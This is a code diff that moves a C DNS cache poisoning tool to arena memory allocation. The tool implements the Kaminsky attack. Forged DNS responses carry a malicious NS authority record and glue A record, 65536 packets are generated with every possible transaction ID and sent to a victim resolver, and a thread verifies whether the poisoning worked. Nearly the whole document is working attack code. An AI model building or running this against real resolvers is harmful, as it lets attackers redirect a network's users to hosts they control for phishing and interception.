@@ -38,7 +38,8 @@ static void* verify_poison_thread(void* args) {
     verify_context_t* ctx = (verify_context_t*)args;
     printf("[Verify] Verification thread started. Checking for domain '%s' -> IP '%s'\n",
            ctx->verify_domain, ctx->expected_ip);
-
+    
+    Arena arena = {0};
     while (!g_stop_verify_thread) {
         sleep(VERIFY_INTERVAL_S);
         if (g_stop_verify_thread) break;
@@ -53,9 +54,8 @@ static void* verify_poison_thread(void* args) {
 
         // 1. 发送查询请求
         struct dns_query* query[1];
-        query[0] = new_dns_query_a(ctx->verify_domain);
-        send_dns_req(sockfd, ctx->victim_ip, 53, query, 1);
-        free_dns_query(query[0]);
+        query[0] = new_dns_query_a(&arena, ctx->verify_domain);
+        send_dns_req(&arena, sockfd, ctx->victim_ip, 53, query, 1);
 
         // 2. 接收并解析响应
         uint8_t buffer[1024];
@@ -68,7 +68,7 @@ static void* verify_poison_thread(void* args) {
         }
 
         parsed_dns_packet_t dns_packet;
-        if (!unpack_dns_packet(buffer, n, &dns_packet)) {
+        if (!unpack_dns_packet(&arena, buffer, n, &dns_packet)) {
             fprintf(stderr, "[Verify] Failed to parse DNS response.\n");
             continue;
         }
@@ -93,8 +93,6 @@ static void* verify_poison_thread(void* args) {
             }
         }
 
-        free_parsed_dns_packet(&dns_packet);
-
         if (success) {
             printf("[Verify] Sending stop signal to main loop...\n");
             uv_async_send(ctx->sender->stop_async);
@@ -109,6 +107,7 @@ static void* verify_poison_thread(void* args) {
     free(ctx->verify_domain);
     free(ctx->expected_ip);
     free(ctx);
+    arena_free(&arena);
     return NULL;
 }
 
@@ -171,11 +170,11 @@ bool make_kaminsky_packets(Arena* arena, packet_queue_t* queue, void* args) {
     struct dns_answer* authori[1];
     struct dns_answer* additional[1];
 
-    query[0] = new_dns_query_a(s_args->random_domain);
-    authori[0] = new_dns_answer_ns(s_args->target_domain, s_args->poison_ns_name, RES_TTL);
-    additional[0] = new_dns_answer_a(s_args->poison_ns_name, inet_addr(s_args->poison_ns_ip), RES_TTL);
+    query[0] = new_dns_query_a(arena, s_args->random_domain);
+    authori[0] = new_dns_answer_ns(arena, s_args->target_domain, s_args->poison_ns_name, RES_TTL);
+    additional[0] = new_dns_answer_a(arena, s_args->poison_ns_name, inet_addr(s_args->poison_ns_ip), RES_TTL);
 
-    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
+    uint8_t* dns_payload = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
     size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, 
                                      query, 1,           // 1 Question
                                      NULL, 0,            // 0 Answers
@@ -190,15 +189,9 @@ bool make_kaminsky_packets(Arena* arena, packet_queue_t* queue, void* args) {
                                             53, 
                                             s_args->victim_port,
                                             dns_payload, dns_payload_len);
-    
-    free(dns_payload);
-    free_dns_query(query[0]);
-    free_dns_answer(authori[0]);
-    free_dns_answer(additional[0]);
 
     if (packet_raw_len == 0) {
         fprintf(stderr, "[-] Failed to create packet template.\n");
-        free(packet_template);
         return false;
     }
 
@@ -210,8 +203,8 @@ bool make_kaminsky_packets(Arena* arena, packet_queue_t* queue, void* args) {
 
     // 2. Generate 65536 packets, each with a different TXID
     for (uint32_t i = 0; i <= UINT16_MAX; i++) {
-        packet_t* new_pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
-        new_pkt->data = (uint8_t*)arena_alloc(arena, packet_raw_len);
+        packet_t* new_pkt = (packet_t*)arena_alloc_memory(arena, sizeof(packet_t));
+        new_pkt->data = (uint8_t*)arena_alloc_memory(arena, packet_raw_len);
         new_pkt->size = packet_raw_len;
         new_pkt->next = NULL;
         memcpy(&new_pkt->dest_addr, &dest_addr_template, sizeof(dest_addr_template));
